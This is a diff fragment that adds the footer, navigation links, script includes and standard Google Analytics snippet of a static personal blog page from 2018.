+        <li id="share"><a class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2018 Chen Xiaoyuan
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="../../index.html">Home</a></li>
+         
+          <li><a href="../../about/">About</a></li>
+         
+          <li><a href="../../archives/">Writing</a></li>
+         
+          <li><a href="http://github.com/probberechts">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="../../lib/font-awesome/css/font-awesome.min.css">
+<link rel="stylesheet" href="../../lib/meslo-LG/styles.css">
+<link rel="stylesheet" href="../../lib/justified-gallery/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="../../lib/jquery/jquery.min.js"></script>
+<script src="../../lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+<script src="../../js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-86660611-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Disqus Comments -->
+
+
